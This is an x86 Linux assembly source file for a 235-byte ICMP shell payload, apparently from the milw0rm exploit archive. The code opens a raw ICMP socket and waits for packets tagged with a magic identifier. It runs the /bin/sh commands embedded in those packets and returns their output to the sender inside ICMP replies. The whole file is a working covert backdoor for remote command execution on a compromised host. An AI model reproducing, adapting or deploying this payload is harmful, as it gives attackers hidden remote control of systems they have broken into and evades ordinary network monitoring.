;
; Copyright (c) 2007 by <mu-b@digit-labs.org>
;
; 235-byte raw-socket ICMP/checksum shell - (x86-lnx)
; by mu-b - Nov 2006
;
; icmp with identifier __flag_byte and commands in the
; following format:-
;       "/bin/sh\x00-c\x00<command here>\x00"
;
; unlike *other* icmp shells, this will reply with
; 255-(sizeof icmp_hdr) bytes of output..
;

%define zero_reg        esi
%define zero_reg_w      si
%define sock_reg        edi
%define __flag_byte     6996h

global _shell

_shell:
 xor   zero_reg, zero_reg
 mov   ebp, esp

 ; sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
_socket:
 lea   ebx, [zero_reg+3]
 push  byte 1
 push  ebx
 dec   ebx
 push  ebx
 dec   ebx
 mov   ecx, esp
 lea   eax, [zero_reg+66h]
 int   80h                 ; socket();
 mov   sock_reg, eax

 ; setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &1, 1);
_setsockopt:
 push  ebx
 push  esp
 push  byte 3h
 push  zero_reg
 push  sock_reg
 mov   ecx, esp
 mov   bl, byte 0eh
 mov   al, byte 66h
 int   80h                 ; setsocketopt();

 ; while(1)
_while_loop:
 ; read(sockfd, cmd, 255);
 cdq
 dec   byte dl
 mov   ecx, ebp
 mov   ebx, sock_reg
 lea   eax, [zero_reg+3]
 int   80h                 ; read();

 lea   ebx, [ebp+24]
 xor   [ebx], word __flag_byte
 jne   short _while_loop

 ; pipe(pp)
 lea   ebx, [ebp-8]
 mov   al, byte 2ah
 int   80h                 ; pipe();

 ; fork()
 mov   al, byte 2h
 int   80h                 ; fork();
 test  eax, eax
 jnz   short _parent

_child:
 ; close(pp[0])
 mov   ebx, [ebp-8]
 mov   al, byte 6h
 int   80h                 ; close();

 ; dup2(pp[1], 0); dup2(pp[1], 1); dup2(pp[1], 2);
 lea   ecx, [zero_reg+3]
 ; pp[1] == pp[0]+1
 inc   ebx

.1:
 dec   ecx
 mov   al, byte 3fh
 int   80h                 ; dup2();
 jnz   .1

 ; execve(cmd + 28, {cmd + 28, cmd + 36, cmd + 39, 0}, 0);
 push  zero_reg
 lea   ebx, [ebp+39]
 push  ebx
 sub   ebx, byte 3
 push  ebx
 sub   ebx, byte 8
 push  ebx
 mov   ecx, esp
 cdq
 mov   al, byte 0bh
 int   80h                 ; execve();

_parent:
 ; close(pp[1])
 mov   ebx, [ebp-4]
 lea   eax, [zero_reg+6]
 int   80h                 ; close();

_parent_read:
.1:
 ; read(pp[0], cmd, bytes_left);
 ; edx == 255
 lea   ecx, [ebp+28]
 mov   ebx, [ebp-8]
 mov   al, byte 3h
 int   80h                 ; read();
 test  eax, eax
 jl    _while_loop

 mov   al, byte 6h
 int   80h                 ; close();

.2:
 ; fix up ttl (optional?! make sure its high!)
 ; mov   [ebp+8], byte 0ffh

 ; switch ip's
 mov   ecx, [ebp+12]
 xchg  [ebp+16], ecx
 mov   [ebp+12], ecx

 ; set icmp type to echo reply (optional?!)
 ;mov   [ebp+20], word zero_reg_w
 ; zero checksum
 ;mov   [ebp+22], word zero_reg_w
 ; set icmp type to echo and zero checksum
 mov   [ebp+20], zero_reg

 lea   ecx, [zero_reg+117]
 lea   esi, [ebp+20]
 cdq

.3:
 lodsw
 add   edx, eax
 loop  .3

 lodsb
 xor   ah, ah
 add   eax, edx
 mov   esi, eax

 shr   eax, byte 16
 movzx esi, si
 add   eax, esi
 mov   edx, eax
 shr   edx, byte 16
 add   eax, edx
 not   ax

 ; set checksum
 mov   [ebp+22], word ax

 cdq
 xor   eax, eax
 xor   zero_reg, zero_reg

 ; struct sockaddr *
 push  zero_reg
 push  zero_reg
 push  dword [ebp+16]
 push  byte 2

 ; sendto(sockfd, cmd, 255, 0, ...);
 mov   ecx, esp
 push  byte 16
 push  ecx
 push  zero_reg
 mov   dl, byte 0ffh
 push  edx
 push  ebp
 push  sock_reg
 mov   ecx, esp
 mov   bl, 0bh
 mov   al, 66h
 int   80h                 ; sendto();

 cdq
 mov   ecx, ebp
 mov   ebx, zero_reg
 mov   al, 72h
 int   80h                 ; wait();

 jmp   _while_loop

; milw0rm.com [2007-04-02]